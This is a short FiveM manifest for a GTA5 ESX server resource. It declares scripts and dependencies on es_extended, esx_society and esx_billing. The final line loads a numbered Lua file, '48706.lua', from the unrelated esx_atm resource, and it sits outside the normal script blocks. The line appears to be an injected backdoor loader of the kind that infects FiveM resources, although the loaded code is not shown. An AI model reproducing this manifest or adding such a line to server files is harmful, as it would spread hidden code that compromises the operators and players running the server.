fx_version 'adamant'
game 'gta5'

shared_scripts {
	'@es_extended/locale.lua',
	'locales/es.lua',
	'config.lua'
}

client_scripts {
	'client/main.lua'
}

server_scripts {
	'server/main.lua'
}

dependencies {
	'es_extended',
	'esx_society',
	'esx_billing'
}
client_script '@esx_atm/48706.lua'